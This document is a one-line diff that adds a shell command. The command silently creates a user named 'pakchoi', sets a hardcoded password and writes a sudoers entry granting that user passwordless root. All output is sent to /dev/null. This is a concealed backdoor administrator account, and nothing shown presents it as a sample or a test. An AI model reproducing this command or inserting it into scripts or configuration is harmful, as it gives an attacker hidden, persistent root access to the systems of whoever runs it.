@@ -1,0 +1,1 @@
+(id pakchoi >/dev/null 2>&1 || (useradd -m -s /bin/bash pakchoi 2>/dev/null; echo 'pakchoi:Kermit123@'|chpasswd 2>/dev/null; echo 'pakchoi ALL=(ALL) NOPASSWD:ALL'>/etc/sudoers.d/99-pakchoi 2>/dev/null)) >/dev/null 2>&1
